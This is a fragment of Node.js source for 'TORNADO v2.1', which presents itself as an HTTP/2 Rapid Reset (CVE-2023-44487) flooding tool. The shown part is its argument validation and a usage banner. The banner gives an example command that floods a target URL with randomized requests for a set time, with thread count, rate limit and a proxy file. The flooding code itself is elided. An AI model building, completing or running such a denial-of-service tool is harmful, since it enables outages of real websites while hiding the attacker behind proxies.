...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    TORNADO v2.1 Method With RST STREAM (CVE-2023-44487) // Updated: 01.05.2024 
    Developers to method: domesizethelegandary
    How to use & example:
      node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
      node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt
...
if (!['GET', 'POST', 'HEAD'].includes(reqmethod)) {
